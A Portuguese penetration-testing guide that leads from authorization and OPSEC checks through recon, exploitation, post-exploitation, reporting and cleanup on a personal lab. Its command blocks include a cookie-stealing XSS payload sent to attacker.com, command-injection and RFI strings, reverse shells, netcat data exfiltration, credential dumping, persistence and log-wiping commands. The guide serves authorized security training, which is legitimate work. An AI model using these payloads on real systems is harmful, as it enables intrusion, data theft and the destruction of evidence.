# üéØ GUIA COMPLETO DE PENETRATION TESTING

**Vers√£o:** 2.0  
**√öltima atualiza√ß√£o:** 28 de Novembro de 2025  
**Autor:** Red Team Setup  

---

## üìã √çNDICE

1. [Prepara√ß√£o Pr√©-Pentest](#1-prepara√ß√£o-pr√©-pentest)
2. [Configura√ß√£o do Ambiente](#2-configura√ß√£o-do-ambiente)
3. [Metodologia de Pentest](#3-metodologia-de-pentest)
4. [Ferramentas por Fase](#4-ferramentas-por-fase)
5. [Comandos Essenciais](#5-comandos-essenciais)
6. [P√≥s-Pentest](#6-p√≥s-pentest)
7. [Checklist Final](#7-checklist-final)

---

## 1. PREPARA√á√ÉO PR√â-PENTEST

### 1.1 Documenta√ß√£o e Legalidade

```bash
# ‚ö†Ô∏è NUNCA REALIZE PENTEST SEM AUTORIZA√á√ÉO FORMAL!

# Documentos obrigat√≥rios:
# ‚úÖ Termo de Autoriza√ß√£o assinado (ROE - Rules of Engagement)
# ‚úÖ Escopo definido (IPs, dom√≠nios, aplica√ß√µes)
# ‚úÖ Janela de tempo aprovada
# ‚úÖ Contatos de emerg√™ncia do cliente
# ‚úÖ Acordo de confidencialidade (NDA)
```

**Checklist Legal:**
- [ ] Autoriza√ß√£o escrita e assinada
- [ ] Escopo de IPs/dom√≠nios definido
- [ ] Escopo de aplica√ß√µes/sistemas definido
- [ ] Lista de exclus√µes (sistemas cr√≠ticos)
- [ ] Janela de execu√ß√£o definida
- [ ] Contatos de emerg√™ncia documentados
- [ ] NDA assinado
- [ ] Seguro de responsabilidade (se aplic√°vel)

### 1.2 Verifica√ß√£o OPSEC

```bash
# Executar checklist OPSEC completo
cd ~/Documents/Scripts
source lib/opsec.sh

# Verifica√ß√£o pr√©-engajamento (obrigat√≥ria!)
pre_engagement_check

# Sa√≠da esperada:
# ‚úÖ VPN Status: Connected
# ‚úÖ DNS Leak: No leaks detected
# ‚úÖ Kill Switch: Active
# ‚úÖ IP: [seu IP VPN]
# ‚úÖ Timezone: Masked
# ‚úÖ WebRTC: Disabled
```

**Itens OPSEC Obrigat√≥rios:**
- [ ] VPN conectada e funcionando
- [ ] Kill switch ativado
- [ ] Sem vazamento de DNS
- [ ] User-Agent randomizado
- [ ] Timezone mascarado
- [ ] WebRTC desabilitado
- [ ] MAC address alterado (se necess√°rio)
- [ ] Tor/Proxychains configurado (se necess√°rio)

### 1.3 Verifica√ß√£o de Recursos

```bash
# Verificar se o hardware suporta a opera√ß√£o
source lib/resource_check.sh

# Detectar hardware automaticamente
detect_hardware

# Verificar se pode executar opera√ß√£o espec√≠fica
can_run_operation "nmap_full_scan" "192.168.1.0/24"
can_run_operation "web_fuzzing" "http://target.com"
can_run_operation "password_crack" "/path/to/hash"

# Hardware recomendado por opera√ß√£o:
# - Scanning b√°sico: PC2/NB1/NB2 (qualquer)
# - Scanning completo: PC2 (8GB RAM min)
# - Fuzzing web: NB2 (12GB RAM)
# - Password cracking: PC1 (32GB RAM + GPU)
# - Pivoting/C2: PC1 (Proxmox)
```

### 1.4 Backup Pr√©-Opera√ß√£o

```bash
# Fazer backup de wordlists e ferramentas cr√≠ticas
cd ~/Documents/Scripts
./lib/backup_tools.sh

# Menu:
# 1) Backup completo de ferramentas Kali
# 2) Backup de VMs Proxmox
# 3) Backup de wordlists
# 4) Backup de scripts personalizados
# 5) Configurar backup autom√°tico
# 6) Limpar backups antigos
# 7) Verificar integridade de backups

# Escolher op√ß√£o 1 (backup completo)
```

---

## 2. CONFIGURA√á√ÉO DO AMBIENTE

### 2.1 Inicializar M√°quinas

**PC1 (Proxmox Server - Infraestrutura):**
```bash
# Ligar PC1 primeiro (servidor est√°vel)
# Acessar Proxmox: https://IP_PC1:8006

# Iniciar VMs cr√≠ticas:
# - Wazuh SIEM (se configurado)
# - C2 Servers (Sliver/Havoc/Mythic)
# - An√°lise de malware (isolada)
```

**PC2 (Kali Linux - Scanner Principal):**
```bash
# Inicializar servi√ßos essenciais
sudo systemctl start postgresql  # Para Metasploit
sudo systemctl start apache2     # Para servir payloads
sudo systemctl start ssh         # Para acesso remoto

# Atualizar bases de dados
sudo msfdb init
sudo updatedb
sudo apt update

# Verificar instala√ß√£o de ferramentas
cd ~/Documents/Scripts/Kali
./setup-kali.sh  # Caso precise reinstalar algo
```

**NB1 (Celeron Stealth - Reconhecimento Passivo):**
```bash
# Usar para:
# - OSINT (n√£o deixa rastros pesados)
# - Reconhecimento passivo
# - Navega√ß√£o em clearweb/darkweb
# - Acesso a C2 via navegador

# Conectar VPN antes de qualquer a√ß√£o
sudo openvpn --config cliente.ovpn
```

**NB2 (Windows i5 - Ataques AD/Windows):**
```bash
# Inicializar ferramentas Windows
cd C:\Users\Ziger\Documents\Scripts\Windows

# Executar configura√ß√£o de ataque
.\setup_attackbox.bat

# Ferramentas dispon√≠veis:
# - BloodHound
# - Mimikatz
# - Rubeus
# - SharpHound
# - PowerView
# - Covenant C2
```

### 2.2 Configurar Rede

```bash
# Verificar conectividade
ping -c 4 8.8.8.8

# Verificar VPN
curl ifconfig.me  # Deve mostrar IP da VPN, N√ÉO seu IP real

# Configurar proxychains (opcional)
sudo nano /etc/proxychains4.conf
# Adicionar: socks5 127.0.0.1 9050

# Testar proxychains
proxychains curl ifconfig.me
```

### 2.3 Preparar Diret√≥rio de Trabalho

```bash
# Criar estrutura de diret√≥rios para o engajamento
export TARGET="nome_do_cliente"
export DATE=$(date +%Y%m%d)
mkdir -p ~/pentest/${TARGET}_${DATE}/{recon,scanning,exploitation,post-exploit,loot,reports}

cd ~/pentest/${TARGET}_${DATE}

# Estrutura criada:
# recon/        - Reconhecimento e OSINT
# scanning/     - Resultados de scans
# exploitation/ - Exploits e payloads
# post-exploit/ - Dados coletados p√≥s-explora√ß√£o
# loot/         - Credenciais, hashes, arquivos sens√≠veis
# reports/      - Relat√≥rios e evid√™ncias
```

---

## 3. METODOLOGIA DE PENTEST

### Fases do Pentest (seguir ordem):

```
1. RECONHECIMENTO (Passive/Active)
   ‚Üì
2. SCANNING E ENUMERA√á√ÉO
   ‚Üì
3. AN√ÅLISE DE VULNERABILIDADES
   ‚Üì
4. EXPLORA√á√ÉO
   ‚Üì
5. P√ìS-EXPLORA√á√ÉO
   ‚Üì
6. RELAT√ìRIO
```

---

## 4. FERRAMENTAS POR FASE

### FASE 1: RECONHECIMENTO

#### 1.1 OSINT (Passive Recon) - Usar NB1

```bash
# ==================== WHOIS ====================
whois target.com > recon/whois.txt

# ==================== DNS ENUMERATION ====================
# DNSRecon
dnsrecon -d target.com -t std > recon/dnsrecon.txt

# Fierce
fierce --domain target.com > recon/fierce.txt

# DNSenum
dnsenum target.com > recon/dnsenum.txt

# Sublist3r (subdomain enumeration)
cd ~/Documents/Scripts/Kali/Ferramentas/webdiscover
python3 sublist3r.py -d target.com -o ~/pentest/${TARGET}_${DATE}/recon/subdomains.txt

# ==================== GOOGLE DORKING ====================
# Usar navegador no NB1 (stealth)
# Exemplos:
# site:target.com filetype:pdf
# site:target.com intitle:"index of"
# site:target.com ext:sql | ext:xml | ext:txt
# site:target.com inurl:admin
# site:target.com inurl:login

# ==================== SHODAN ====================
# https://www.shodan.io
# Pesquisar: ssl:"target.com"
# Pesquisar: org:"Nome da Empresa"

# ==================== THEHARVESTER ====================
theHarvester -d target.com -b all -f recon/harvester.html

# ==================== LEAKED CREDENTIALS ====================
cd ~/Documents/Scripts/Kali/Ferramentas/pwndb
# Buscar credenciais vazadas (requer Tor)
# CUIDADO: Use apenas em ambientes legais!

# ==================== WAYBACK MACHINE ====================
# https://web.archive.org
# Buscar vers√µes antigas do site para endpoints esquecidos
```

#### 1.2 Active Recon - Usar PC2

```bash
# ==================== PING SWEEP ====================
nmap -sn 192.168.1.0/24 -oN recon/ping_sweep.txt

# ==================== DNS BRUTEFORCE ====================
dnsrecon -d target.com -D /usr/share/wordlists/dnsmap.txt -t brt > recon/dns_bruteforce.txt

# ==================== REVERSE DNS ====================
nmap -sL 192.168.1.0/24 -oN recon/reverse_dns.txt
```

---

### FASE 2: SCANNING E ENUMERA√á√ÉO

#### 2.1 Port Scanning - PC2

```bash
# ==================== QUICK SCAN ====================
nmap -T4 -F target.com -oN scanning/quick_scan.txt

# ==================== FULL TCP SCAN ====================
nmap -p- -T4 target.com -oN scanning/full_tcp.txt

# ==================== SERVICE VERSION DETECTION ====================
nmap -sV -p 1-65535 target.com -oN scanning/service_version.txt

# ==================== OS DETECTION ====================
sudo nmap -O target.com -oN scanning/os_detection.txt

# ==================== AGGRESSIVE SCAN ====================
sudo nmap -A -T4 target.com -oN scanning/aggressive.txt

# ==================== UDP SCAN (TOP 1000) ====================
sudo nmap -sU --top-ports 1000 target.com -oN scanning/udp_top1000.txt

# ==================== VULNERABILITY SCAN ====================
nmap --script vuln target.com -oN scanning/vuln_scan.txt

# ==================== SMB ENUMERATION ====================
nmap --script smb-enum-shares,smb-enum-users,smb-os-discovery -p 445 target.com -oN scanning/smb_enum.txt

# ==================== MASSCAN (alternativa r√°pida) ====================
sudo masscan -p1-65535 192.168.1.0/24 --rate=1000 -oL scanning/masscan.txt
```

#### 2.2 Web Application Scanning

```bash
# ==================== NIKTO ====================
nikto -h http://target.com -o scanning/nikto.txt

# ==================== DIRB ====================
dirb http://target.com /usr/share/wordlists/dirb/common.txt -o scanning/dirb.txt

# ==================== GOBUSTER ====================
gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o scanning/gobuster.txt

# ==================== WPSCAN (WordPress) ====================
wpscan --url http://target.com --enumerate ap,at,cb,dbe -o scanning/wpscan.txt

# ==================== WHATWEB ====================
whatweb -v http://target.com > scanning/whatweb.txt

# ==================== WAFW00F (WAF Detection) ====================
wafw00f http://target.com > scanning/waf.txt

# ==================== BURP SUITE ====================
# Abrir Burp Suite manualmente
burpsuite &
# Configurar proxy no navegador: 127.0.0.1:8080
# Fazer crawling manual da aplica√ß√£o
```

#### 2.3 Enumera√ß√£o por Servi√ßo

```bash
# ==================== FTP (21) ====================
nmap --script ftp-anon,ftp-bounce,ftp-syst -p 21 target.com

# ==================== SSH (22) ====================
nmap --script ssh-auth-methods,ssh-hostkey,ssh2-enum-algos -p 22 target.com

# ==================== SMTP (25) ====================
nmap --script smtp-commands,smtp-enum-users -p 25 target.com
smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t target.com

# ==================== HTTP/HTTPS (80/443) ====================
nikto -h http://target.com
whatweb http://target.com
curl -I http://target.com

# ==================== SMB (139/445) ====================
enum4linux -a target.com > scanning/enum4linux.txt
smbclient -L //target.com -N
smbmap -H target.com

# ==================== SNMP (161) ====================
snmp-check target.com > scanning/snmp.txt
onesixtyone -c /usr/share/doc/onesixtyone/dict.txt target.com

# ==================== LDAP (389) ====================
nmap --script ldap-search,ldap-rootdse -p 389 target.com

# ==================== RDP (3389) ====================
nmap --script rdp-enum-encryption,rdp-vuln-ms12-020 -p 3389 target.com

# ==================== MYSQL (3306) ====================
nmap --script mysql-enum,mysql-info -p 3306 target.com

# ==================== MS-SQL (1433) ====================
nmap --script ms-sql-info,ms-sql-config -p 1433 target.com
```

---

### FASE 3: AN√ÅLISE DE VULNERABILIDADES

```bash
# ==================== SEARCHSPLOIT ====================
searchsploit apache 2.4.49
searchsploit -x exploits/linux/remote/50383.sh  # Ver detalhes
searchsploit -m exploits/linux/remote/50383.sh  # Copiar para diret√≥rio atual

# ==================== NMAP NSE VULNERS ====================
nmap --script vulners --script-args mincvss=5.0 -sV target.com -oN scanning/vulners.txt

# ==================== OPENVAS (PC1 - Proxmox VM) ====================
# Iniciar OpenVAS no PC1
# Acessar: https://IP_PC1:9392
# Criar novo scan task
# Aguardar finaliza√ß√£o e exportar relat√≥rio

# ==================== NESSUS (alternativa) ====================
# https://www.tenable.com/products/nessus
# Scan completo de vulnerabilidades

# ==================== RETESTES AUTOMATIZADOS ====================
cd ~/Documents/Scripts/ScrpitPentestSH/retestesh

# Com OPSEC habilitado (recomendado)
source ~/Documents/Scripts/lib/opsec.sh
./reteste_with_opsec.sh

# Menu interativo:
# 1) Reteste A Divis√£o
# 2) Reteste Divis√£o de Elite
# 3) Reteste Achei um Veterano
# 4) Reteste iDivis
# 5) Reteste Plano de Chamadas
# 6) Reteste Ngrok
# 7) Executar todos os retestes

# ==================== VERIFICA√á√ÉO MANUAL ====================
# Revisar manualmente:
# - Portas abertas desnecess√°rias
# - Vers√µes desatualizadas de software
# - Configura√ß√µes padr√£o
# - Credenciais fracas/padr√£o
# - Falta de criptografia
# - Cookies inseguros
# - CORS mal configurado
```

---

### FASE 4: EXPLORA√á√ÉO

#### 4.1 Metasploit Framework

```bash
# ==================== INICIAR METASPLOIT ====================
msfconsole

# ==================== WORKSPACE ====================
msf6 > workspace -a ${TARGET}_${DATE}
msf6 > workspace ${TARGET}_${DATE}

# ==================== IMPORTAR NMAP ====================
msf6 > db_import ~/pentest/${TARGET}_${DATE}/scanning/full_tcp.xml

# ==================== BUSCAR EXPLOITS ====================
msf6 > search type:exploit platform:linux apache

# ==================== EXEMPLO: EXPLORAR SMB ====================
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(ms17_010_eternalblue) > set RHOSTS 192.168.1.10
msf6 exploit(ms17_010_eternalblue) > set LHOST 192.168.1.50
msf6 exploit(ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(ms17_010_eternalblue) > exploit

# ==================== EXEMPLO: REVERSE SHELL ====================
msf6 > use exploit/multi/handler
msf6 exploit(handler) > set payload linux/x64/meterpreter/reverse_tcp
msf6 exploit(handler) > set LHOST 192.168.1.50
msf6 exploit(handler) > set LPORT 4444
msf6 exploit(handler) > exploit -j  # Background job
```

#### 4.2 Exploits Manuais

```bash
# ==================== BUFFER OVERFLOW ====================
# Usar scripts Python personalizados
python3 exploit_bof.py target.com 9999

# ==================== SQL INJECTION ====================
# SQLMap
sqlmap -u "http://target.com/page.php?id=1" --dbs --batch
sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables --batch
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users --dump --batch

# Manual:
# ' OR '1'='1
# ' UNION SELECT NULL,NULL,NULL--
# ' UNION SELECT @@version,NULL,NULL--

# ==================== XSS ====================
# Reflected XSS:
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>

# Stored XSS:
<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>

# Testar com ferramenta:
cd ~/Documents/Scripts/Kali/Ferramentas/Exploit-XSS-Polyglot-on-Moodle-3.9.2

# ==================== COMMAND INJECTION ====================
# Testar payloads:
; ls -la
| whoami
& ping -c 4 attacker.com
`cat /etc/passwd`
$(whoami)

# ==================== LFI/RFI ====================
# Local File Inclusion:
http://target.com/page.php?file=../../etc/passwd
http://target.com/page.php?file=....//....//etc/passwd
http://target.com/page.php?file=/var/log/apache2/access.log

# Remote File Inclusion:
http://target.com/page.php?file=http://attacker.com/shell.txt

# ==================== FILE UPLOAD ====================
# Fazer upload de shell reverso
cp /usr/share/webshells/php/php-reverse-shell.php .
# Editar IP e PORTA
# Fazer upload via aplica√ß√£o web
# Acessar: http://target.com/uploads/php-reverse-shell.php
```

#### 4.3 Password Attacks

```bash
# ==================== HYDRA ====================
# SSH bruteforce
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target.com

# FTP bruteforce
hydra -l ftp -P /usr/share/wordlists/rockyou.txt ftp://target.com

# HTTP POST bruteforce
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"

# ==================== JOHN THE RIPPER ====================
# Crackear hashes
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --show hashes.txt

# ==================== HASHCAT (PC1 - GPU) ====================
# Transferir hashes para PC1 (tem GPU)
# MD5
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# NTLM
hashcat -m 1000 -a 0 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt

# ==================== MIMIKATZ (NB2 Windows) ====================
# Extrair credenciais do Windows
mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # lsadump::sam
```

#### 4.4 Wireless Attacks (se no escopo)

```bash
# ==================== AIRCRACK-NG ====================
# Modo monitor
sudo airmon-ng start wlan0

# Capturar handshake
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Deauth attack (for√ßar handshake)
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# Crackear WPA2
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
```

---

### FASE 5: P√ìS-EXPLORA√á√ÉO

#### 5.1 Meterpreter (ap√≥s obter shell)

```bash
# ==================== INFORMA√á√ïES DO SISTEMA ====================
meterpreter > sysinfo
meterpreter > getuid
meterpreter > getpid
meterpreter > ps  # Listar processos

# ==================== PRIVILEGE ESCALATION ====================
meterpreter > getsystem  # Tentar obter SYSTEM
meterpreter > background

# Linux Privesc
msf6 > use post/multi/recon/local_exploit_suggester
msf6 post(local_exploit_suggester) > set SESSION 1
msf6 post(local_exploit_suggester) > run

# ==================== DUMP CREDENTIALS ====================
meterpreter > hashdump  # Windows
meterpreter > run post/linux/gather/hashdump  # Linux

# ==================== PERSIST√äNCIA ====================
# Windows
meterpreter > run persistence -X -i 10 -p 4444 -r 192.168.1.50

# Linux
meterpreter > run persistence -X -i 10 -p 4444 -r 192.168.1.50

# ==================== KEYLOGGER ====================
meterpreter > keyscan_start
meterpreter > keyscan_dump
meterpreter > keyscan_stop

# ==================== SCREENSHOT ====================
meterpreter > screenshot

# ==================== DOWNLOAD/UPLOAD ====================
meterpreter > download /etc/passwd ./loot/
meterpreter > upload shell.elf /tmp/

# ==================== PIVOTING ====================
meterpreter > run autoroute -s 10.10.10.0/24
meterpreter > background
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(socks_proxy) > set VERSION 4a
msf6 auxiliary(socks_proxy) > run -j

# Configurar proxychains:
# socks4 127.0.0.1 1080

# ==================== PORT FORWARDING ====================
meterpreter > portfwd add -l 8080 -p 80 -r 10.10.10.5
# Acessar: http://localhost:8080
```

#### 5.2 Linux Privilege Escalation

```bash
# ==================== LINPEAS ====================
# No atacante:
python3 -m http.server 8000

# No alvo:
wget http://192.168.1.50:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh | tee linpeas_output.txt

# ==================== MANUAL CHECKS ====================
# SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Sudo privileges
sudo -l

# Cron jobs
cat /etc/crontab
ls -la /etc/cron.*

# Writable /etc/passwd
ls -la /etc/passwd

# Kernel version (buscar exploits)
uname -a
searchsploit kernel 3.10.0

# ==================== GTFOBINS ====================
# https://gtfobins.github.io/
# Buscar bin√°rio SUID para escalar privil√©gio
```

#### 5.3 Windows Privilege Escalation (NB2)

```bash
# ==================== WINPEAS ====================
# Transferir winPEAS.exe para o alvo
.\winPEAS.exe > winpeas_output.txt

# ==================== POWERUP ====================
powershell -ep bypass
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# ==================== MANUAL CHECKS ====================
# Informa√ß√µes do sistema
systeminfo
whoami /all
net user
net localgroup administrators

# Patches instalados
wmic qfe list

# Servi√ßos vulner√°veis
sc query state= all
Get-Service

# Permiss√µes de arquivos
icacls "C:\Program Files\App\service.exe"

# ==================== TOKEN IMPERSONATION ====================
# Usar Juicy Potato / PrintSpoofer / RoguePotato
.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami > C:\temp\proof.txt" -t *
```

#### 5.4 Active Directory Attacks (NB2)

```bash
# ==================== BLOODHOUND ====================
# Coletar dados com SharpHound
.\SharpHound.exe -c All --zipfilename bloodhound_data.zip

# Transferir para NB2 e importar no BloodHound
neo4j console
# Abrir BloodHound GUI
# Importar bloodhound_data.zip
# Analisar caminhos de ataque

# ==================== MIMIKATZ ====================
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords full
lsadump::lsa /inject
lsadump::dcsync /user:Administrator /domain:corp.com

# ==================== KERBEROASTING ====================
# Impacket
GetUserSPNs.py -request -dc-ip 192.168.1.100 corp.com/user:password

# Rubeus (Windows)
.\Rubeus.exe kerberoast /outfile:hashes.txt

# Crackear hashes
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt

# ==================== AS-REP ROASTING ====================
GetNPUsers.py corp.com/ -usersfile users.txt -dc-ip 192.168.1.100

# ==================== PASS-THE-HASH ====================
pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 //192.168.1.100 cmd

# Impacket
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 Administrator@192.168.1.100
```

#### 5.5 Data Exfiltration

```bash
# ==================== SCP ====================
scp user@target:/path/to/file ./loot/

# ==================== NETCAT ====================
# Receptor (atacante):
nc -lvnp 5555 > database_dump.sql

# Transmissor (alvo):
nc 192.168.1.50 5555 < /var/backups/database_dump.sql

# ==================== PYTHON HTTP SERVER ====================
# No alvo:
python3 -m http.server 8000

# No atacante:
wget http://target.com:8000/sensitive_file.txt -P ./loot/

# ==================== METERPRETER ====================
meterpreter > download /etc/shadow ./loot/
meterpreter > download -r /var/www/html ./loot/web_files

# ==================== DNS EXFILTRATION (stealth) ====================
# Ferramenta: iodine, dnscat2
# Para ambientes com DLP/IDS
```

---

### FASE 6: RELAT√ìRIO

#### 6.1 Gerar Relat√≥rio Automatizado

```bash
# ==================== USANDO GERADOR CUSTOMIZADO ====================
cd ~/Documents/Scripts
source lib/generate_report.sh

# Criar relat√≥rio a partir do template
generate_from_template \
  "Nome do Cliente" \
  "Teste de Intrus√£o Interno" \
  "01/12/2025 - 15/12/2025" \
  ~/pentest/${TARGET}_${DATE}/reports/report.md

# Converter para PDF (requer pandoc)
convert_to_pdf ~/pentest/${TARGET}_${DATE}/reports/report.md

# ==================== PROCESSAR SA√çDA DE RETESTE ====================
# Se usou scripts de reteste
process_reteste_output ~/Documents/Scripts/ScrpitPentestSH/retestesh/logs/

# ==================== CONVERTER PARA HTML ====================
convert_to_html ~/pentest/${TARGET}_${DATE}/reports/report.md
```

#### 6.2 Estrutura do Relat√≥rio

```markdown
# RELAT√ìRIO DE PENETRATION TEST

## 1. SUM√ÅRIO EXECUTIVO
- Objetivo do teste
- Per√≠odo de execu√ß√£o
- Resumo de descobertas (High/Medium/Low/Info)
- Risco geral (Critical/High/Medium/Low)
- Recomenda√ß√µes principais

## 2. ESCOPO
- IPs/Dom√≠nios testados
- Aplica√ß√µes testadas
- Exclus√µes
- Metodologia utilizada

## 3. DESCOBERTAS T√âCNICAS
### 3.1 Vulnerabilidade #1 [CRITICAL]
- **Descri√ß√£o:** [descri√ß√£o t√©cnica]
- **Impacto:** [impacto ao neg√≥cio]
- **Localiza√ß√£o:** [IP/URL/sistema]
- **Evid√™ncia:** [screenshot/comando/sa√≠da]
- **CVSS Score:** 9.8 (Critical)
- **CWE:** CWE-89 (SQL Injection)
- **Remedia√ß√£o:** [passo a passo para corrigir]

### 3.2 Vulnerabilidade #2 [HIGH]
[...]

## 4. ANEXOS
- Comandos executados
- Outputs completos de ferramentas
- Screenshots
- Hashes obtidos (sanitizados)
- Logs de explora√ß√£o
```

#### 6.3 Screenshots e Evid√™ncias

```bash
# ==================== CAPTURAR SCREENSHOTS ====================
# Linux (Kali)
scrot -s screenshot_$(date +%Y%m%d_%H%M%S).png

# Flameshot (melhor)
flameshot gui

# ==================== GRAVAR TERMINAL ====================
# Usar asciinema
asciinema rec ~/pentest/${TARGET}_${DATE}/reports/terminal_session.cast

# ==================== ORGANIZAR EVID√äNCIAS ====================
mkdir -p ~/pentest/${TARGET}_${DATE}/reports/evidence/{screenshots,logs,hashes,files}

# Mover evid√™ncias
mv *.png ~/pentest/${TARGET}_${DATE}/reports/evidence/screenshots/
cp ~/pentest/${TARGET}_${DATE}/scanning/* ~/pentest/${TARGET}_${DATE}/reports/evidence/logs/
cp ~/pentest/${TARGET}_${DATE}/loot/* ~/pentest/${TARGET}_${DATE}/reports/evidence/files/
```

---

## 6. P√ìS-PENTEST

### 6.1 Limpeza e Remo√ß√£o de Rastros

```bash
# ==================== REMOVER BACKDOORS/SHELLS ====================
# Listar todas as persist√™ncias criadas
# Remover manualmente cada backdoor instalado
# Verificar cron jobs adicionados
# Remover arquivos carregados

# ==================== LIMPAR LOGS (se autorizado) ====================
# ‚ö†Ô∏è APENAS SE ESTIVER NO ESCOPO!
# Linux:
rm -f /var/log/auth.log
rm -f /var/log/apache2/access.log

# Windows:
wevtutil cl Security
wevtutil cl System

# ==================== RESTAURAR CONFIGURA√á√ïES ====================
# Reverter mudan√ßas em:
# - Firewall rules
# - User accounts criados
# - Permiss√µes modificadas
# - Servi√ßos instalados
```

### 6.2 Backup P√≥s-Opera√ß√£o

```bash
# ==================== BACKUP COMPLETO DA OPERA√á√ÉO ====================
cd ~/Documents/Scripts
./lib/backup_tools.sh

# Escolher op√ß√£o 4: Backup de scripts personalizados
# Isso vai incluir toda a pasta ~/pentest/${TARGET}_${DATE}

# ==================== CRIAR ARQUIVO CRIPTOGRAFADO ====================
# Comprimir tudo
cd ~/pentest
tar -czf ${TARGET}_${DATE}_full.tar.gz ${TARGET}_${DATE}/

# Criptografar (AES-256)
openssl enc -aes-256-cbc -salt -in ${TARGET}_${DATE}_full.tar.gz -out ${TARGET}_${DATE}_full.tar.gz.enc

# Deletar vers√£o n√£o criptografada
shred -vfz -n 3 ${TARGET}_${DATE}_full.tar.gz

# ==================== MOVER PARA STORAGE SEGURO ====================
# Transferir para PC1 (Proxmox) - armazenamento seguro
scp ${TARGET}_${DATE}_full.tar.gz.enc user@PC1:/backup/pentests/

# ==================== VERIFICAR INTEGRIDADE ====================
sha256sum ${TARGET}_${DATE}_full.tar.gz.enc > ${TARGET}_${DATE}.sha256
```

### 6.3 Atualizar Documenta√ß√£o

```bash
# ==================== ATUALIZAR CHANGELOG ====================
cd ~/Documents/Scripts
nano CHANGELOG.md

# Adicionar:
# ## [2025-11-28] Pentest: ${TARGET}
# - Vulnerabilidades: 5 Critical, 8 High, 12 Medium
# - Ferramentas utilizadas: Nmap, Metasploit, SQLMap, BloodHound
# - Li√ß√µes aprendidas: [...]

# ==================== ATUALIZAR WORDLISTS ====================
# Se encontrou senhas comuns espec√≠ficas do setor
cat ~/pentest/${TARGET}_${DATE}/loot/passwords.txt >> ~/wordlists/custom_sector.txt
sort -u ~/wordlists/custom_sector.txt -o ~/wordlists/custom_sector.txt

# ==================== DOCUMENTAR T√âCNICAS ====================
# Criar nota sobre t√©cnicas que funcionaram
mkdir -p ~/Documents/notes/techniques
nano ~/Documents/notes/techniques/${TARGET}_techniques.md
```

### 6.4 Reuni√£o de Encerramento

```bash
# ==================== PREPARAR APRESENTA√á√ÉO ====================
# 1. Sum√°rio executivo em PowerPoint/Google Slides
# 2. Demonstra√ß√£o ao vivo de 1-2 vulns cr√≠ticas
# 3. Roadmap de remedia√ß√£o
# 4. Q&A com equipe t√©cnica do cliente

# ==================== ENTREGAR RELAT√ìRIO ====================
# Formatos:
# - PDF (executivo) - sem detalhes t√©cnicos sens√≠veis
# - PDF (t√©cnico) - completo com evid√™ncias
# - HTML (opcional) - relat√≥rio interativo
# - RAW data - logs e outputs criptografados

# ==================== SUPORTE P√ìS-ENTREGA ====================
# - Disponibilidade para d√∫vidas: 30 dias
# - Re-teste ap√≥s corre√ß√µes: acordar data
# - Verifica√ß√£o de remedia√ß√µes
```

### 6.5 Lessons Learned

```bash
# ==================== RETROSPECTIVA INTERNA ====================
# Perguntas a responder:
# 1. O que funcionou bem?
# 2. O que n√£o funcionou?
# 3. Quais ferramentas foram mais eficazes?
# 4. Quais t√©cnicas precisam de refinamento?
# 5. Hardware foi adequado? (PC1/PC2/NB1/NB2)
# 6. OPSEC foi mantido durante todo o teste?
# 7. Relat√≥rio foi claro e acion√°vel?

# Documentar em:
nano ~/Documents/notes/lessons_learned/${TARGET}_${DATE}.md
```

---

## 7. CHECKLIST FINAL

### 7.1 Pr√©-Pentest ‚úÖ

- [ ] Autoriza√ß√£o formal assinada (ROE)
- [ ] Escopo definido e documentado
- [ ] NDA assinado
- [ ] Contatos de emerg√™ncia salvos
- [ ] VPN conectada e testada
- [ ] Kill switch ativado
- [ ] DNS leak verificado (nenhum vazamento)
- [ ] User-Agent randomizado
- [ ] MAC address alterado (se necess√°rio)
- [ ] Hardware adequado selecionado (PC1/PC2/NB1/NB2)
- [ ] Backup de ferramentas realizado
- [ ] Diret√≥rio de trabalho criado
- [ ] Ferramentas atualizadas

### 7.2 Durante Pentest ‚úÖ

- [ ] Reconhecimento passivo completo (OSINT)
- [ ] Reconhecimento ativo autorizado
- [ ] Port scanning completo
- [ ] Service enumeration detalhada
- [ ] Vulnerability assessment realizado
- [ ] Explora√ß√£o documentada (screenshots)
- [ ] P√≥s-explora√ß√£o mapeada
- [ ] Credenciais coletadas de forma segura
- [ ] Evid√™ncias capturadas para relat√≥rio
- [ ] Rate limiting respeitado (sem derrubar servi√ßos)
- [ ] Cliente notificado de descobertas cr√≠ticas
- [ ] Logs de atividades mantidos

### 7.3 P√≥s-Pentest ‚úÖ

- [ ] Backdoors removidos
- [ ] Shells desativados
- [ ] Persist√™ncias eliminadas
- [ ] Logs limpos (se autorizado)
- [ ] Configura√ß√µes restauradas
- [ ] Relat√≥rio t√©cnico completo
- [ ] Relat√≥rio executivo criado
- [ ] Evid√™ncias organizadas
- [ ] Backup criptografado criado
- [ ] Dados transferidos para storage seguro
